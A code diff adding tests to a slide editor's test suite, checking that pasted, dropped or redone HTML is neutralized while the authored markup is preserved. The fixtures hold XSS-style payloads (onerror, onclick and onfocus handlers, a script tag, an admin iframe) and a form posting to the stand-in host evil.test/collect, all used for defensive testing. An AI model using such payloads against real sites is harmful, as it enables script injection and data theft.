@@ -50,6 +50,7 @@ import {
   svgBlockSource,
 } from '../../app/components/blocks/slideBlocks.ts';
 import { createPendingFileDeletes } from '../../app/components/blocks/pendingFileDeletes.ts';
+import { watchSlideInput } from '../../app/components/blocks/useBlockRemovalWatch.ts';
 
 const jsdom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
   url: 'https://slides.test/deck-1',
@@ -578,7 +579,7 @@ test.describe('copy and paste across decks', () => {
     );
   });
 
-  test('the clipboard carries the authored form, never this page\'s markers', () => {
+  test("the clipboard carries the authored form, never this page's markers", () => {
     const section = shown(
       '<p>hi</p><img src="x.png" onerror="alert(1)">' +
         '<iframe src="https://app.test/admin"></iframe>' +
@@ -603,10 +604,132 @@ test.describe('copy and paste across decks', () => {
 
   test('copy and cut are handled while editing; a cut never asks about files', () => {
     const watch = source('../../app/components/blocks/useBlockRemovalWatch.ts');
-    expect(watch).toContain("document.addEventListener('copy', onCopyOrCut, true)");
-    expect(watch).toContain("document.addEventListener('cut', onCopyOrCut, true)");
+    expect(watch).toContain("doc.addEventListener('copy', onCopyOrCut, true)");
+    expect(watch).toContain("doc.addEventListener('cut', onCopyOrCut, true)");
     expect(watch).toContain("inputType !== 'deleteByCut'");
-    expect(watch).toContain('adoptPastedHtmlBlocks(section, framesRef.current)');
+    expect(watch).toContain('return watchSlideInput(document, {');
+  });
+});
+
+test.describe('a paste or drop is held to the lists as it lands', () => {
+  const OTHER_ID = '9b2f1c4e-0000-4000-8000-000000000002';
+  const AUTHORED =
+    '<p onclick="window.__spy.push(1)">copy me</p>' +
+    '<img src="x.png" onerror="window.__spy.push(2)">' +
+    '<form action="https://evil.test/collect"><input name="q" onfocus="window.__spy.push(3)"></form>' +
+    '<iframe src="https://app.test/admin"></iframe>' +
+    '<script>window.__spy.push(4)</script>';
+
+  /** An editor page: its deck, the input watch, and a paste of `markup` after the first paragraph. */
+  function editorPage() {
+    const live = new JSDOM(
+      '<!doctype html><body><div class="reveal"><div class="slides">' +
+        '<section data-cm-id="t1"><p>target</p></section></div></div></body>',
+      { url: 'https://slides.test/deck-1', runScripts: 'dangerously' }
+    );
+    const win = live.window as unknown as Window & typeof globalThis & { __spy: number[] };
+    win.__spy = [];
+    const ldoc = win.document;
+    const stop = watchSlideInput(ldoc, { onRemoved: () => {}, frames: () => FRAMES });
+    const section = ldoc.querySelector('section') as HTMLElement;
+    const insert = (markup: string, inputType = 'insertFromPaste') => {
+      const at = section.querySelector('p') as HTMLElement;
+      at.dispatchEvent(new win.InputEvent('beforeinput', { inputType, bubbles: true }));
+      // As the browser inserts it: parsed, then put in the live slide.
+      const parsed = ldoc.createElement('template');
+      parsed.innerHTML = markup;
+      at.after(parsed.content);
+      at.dispatchEvent(new win.InputEvent('input', { inputType, bubbles: true }));
+    };
+    return { win, section, insert, stop };
+  }
+
+  test('copied from a slide, pasted: nothing in it runs, loads or submits', () => {
+    const copiedFrom = shown(AUTHORED);
+    const contents = doc.createDocumentFragment();
+    for (const child of Array.from(copiedFrom.childNodes)) contents.append(child.cloneNode(true));
+    const copied = clipboardHtml(contents, doc);
+    expect(copied).toContain('onclick=');
+
+    const { win, section, insert, stop } = editorPage();
+    insert(copied);
+
+    for (const el of Array.from(section.querySelectorAll('*'))) {
+      for (const type of ['click', 'error', 'focus']) el.dispatchEvent(new win.Event(type));
+    }
+    expect(win.__spy).toEqual([]);
+    expect(section.querySelector('[onclick], [onerror], [onfocus]')).toBeNull();
+    expect(section.querySelector('form')).toBeNull();
+    expect(section.querySelector('script')).toBeNull();
+    expect(section.querySelector('iframe')?.hasAttribute('src')).toBe(false);
+    expect(
+      section
+        .querySelector('p')
+        ?.nextElementSibling?.getAttribute(sessionInertName(marker, 'onclick'))
+    ).toBe('window.__spy.push(1)');
+    // Written back exactly as authored.
+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test("an html block from another deck still names that deck's file", () => {
+    const block = htmlBlockMarkup({
+      id: 'b1',
+      box: BOX,
+      src: 'blocks/ab12cd34.html',
+      rev: REV,
+    }).replace(
+      '<iframe ',
+      `<iframe src="/${OTHER_ID}/frame/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}" `
+    );
+    const { section, insert, stop } = editorPage();
+    insert(block);
+    const frame = section.querySelector('.sl-block iframe');
+    expect(frame?.getAttribute('data-cm-src')).toBe('../week-2/blocks/ab12cd34.html');
+    expect(frame?.getAttribute('src')).toBe(
+      `${EDITOR}/slides/week-2/blocks/ab12cd34.html?cm-rev=${REV}`
+    );
+    stop();
+  });
+
+  test('markup already shown by this page (a drag inside the deck) is not hidden twice', () => {
+    const dragged = shown(AUTHORED).innerHTML;
+    expect(dragged).toContain(`data-cm-inert-node="${marker}"`);
+    const { section, insert, stop } = editorPage();
+    insert(dragged, 'insertFromDrop');
+    const holders = Array.from(section.querySelectorAll('template[data-cm-inert-node]'));
+    expect(holders.length).toBeGreaterThan(0);
+    for (const held of holders) {
+      expect((held as HTMLTemplateElement).content.querySelector('template')).toBeNull();
+    }
+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test('a redo that puts the raw pasted nodes back is held too', () => {
+    const { win, section, insert, stop } = editorPage();
+    insert(AUTHORED, 'historyRedo');
+    for (const el of Array.from(section.querySelectorAll('*'))) {
+      for (const type of ['click', 'error', 'focus']) el.dispatchEvent(new win.Event(type));
+    }
+    expect(win.__spy).toEqual([]);
+    expect(section.querySelector('[onclick], [onerror], [onfocus], form, script')).toBeNull();
+    expect(section.querySelector('iframe')?.hasAttribute('src')).toBe(false);
+    expect(serializeSection(section, FRAMES).html).toBe(`<p>target</p>${AUTHORED}`);
+    stop();
+  });
+
+  test('typing is not touched; only what an insert brought in', () => {
+    const { section, stop, win } = editorPage();
+    const p = section.querySelector('p') as HTMLElement;
+    // Markup this page already held, then plain typing next to it.
+    p.setAttribute(sessionInertName(marker, 'onclick'), 'x');
+    p.dispatchEvent(new win.InputEvent('beforeinput', { inputType: 'insertText', bubbles: true }));
+    p.append('!');
+    p.dispatchEvent(new win.InputEvent('input', { inputType: 'insertText', bubbles: true }));
+    expect(p.getAttribute(sessionInertName(marker, 'onclick'))).toBe('x');
+    expect(p.textContent).toBe('target!');
+    stop();
   });
 });
 
